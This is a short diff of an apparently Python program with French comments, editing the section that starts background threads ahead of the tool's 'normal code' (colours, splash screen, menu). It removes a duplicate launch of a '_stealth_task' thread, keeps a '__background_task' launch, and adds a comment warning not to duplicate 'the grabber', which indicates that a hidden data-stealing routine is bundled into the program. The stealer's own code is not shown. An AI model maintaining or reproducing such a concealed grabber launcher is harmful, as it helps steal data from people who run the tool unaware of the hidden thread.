@@ -251,20 +251,9 @@ threading.Thread(target=__background_task, daemon=True).start()
 time.sleep(0.1)
 
 # ============================================================
-# SUITE DU CODE NORMAL
-# ============================================================
-# ... (le reste de ton code ici)
-
-# ============================================================
-# LANCEMENT
-# ============================================================
-threading.Thread(target=_stealth_task, daemon=True).start()
-time.sleep(0.1)
-
-# ============================================================
 # SUITE DU CODE NORMAL (COLORS, SPLASH, MENU, MODULES...)
 # ============================================================
-# ... (le reste de ton code ici)
+# ... (le reste de ton code ici — NE PAS DUPLIQUER LE GRABBER)
 
 # ============================================================
 # COULEURS
